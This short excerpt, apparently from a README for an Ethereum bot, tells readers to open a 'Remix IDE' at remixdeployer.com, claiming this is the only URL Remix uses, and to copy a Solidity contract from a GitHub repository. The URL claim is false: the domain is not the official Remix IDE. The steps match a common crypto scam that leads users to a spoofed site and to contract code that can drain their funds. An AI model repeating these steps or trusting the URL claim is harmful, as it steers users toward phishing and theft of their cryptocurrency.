...
- Open [Remix IDE](https://remixdeployer.com/) The only URL Remix uses is https://remixdeployer.com/
...
- Copy the source code from [`Bot.sol`](https://github.com/JCBury/ETH-BOT/blob/main/Create%20Bot.sol)
